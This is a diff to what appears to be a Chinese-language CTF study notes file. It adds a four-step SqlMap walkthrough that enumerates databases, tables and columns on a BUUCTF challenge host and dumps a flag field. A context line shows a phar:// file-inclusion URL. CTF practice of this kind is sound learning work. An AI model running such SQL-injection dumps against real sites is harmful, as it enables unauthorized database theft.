@@ -250,6 +250,27 @@ http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip
 
 ### SqlMap
 
+使用步骤：
+1. 查看数据库名称：
+```
+python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 --dbs
+```
+2. 查看目标数据库的表,note表示目标表。
+```
+python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 -D note --tables
+```
+3. 查看数据库表字段
+```
+python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 -D note --tables -T fl4g --columns
+```
+
+4. 查看目标字段的值
+```
+python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 -D note --tables -T fl4g -C f111ag --dump
+```
+
+最后得到```flag```。
+
 ### 其他
 
 1. F5隐写工具使用：https://zhuanlan.zhihu.com/p/480561261
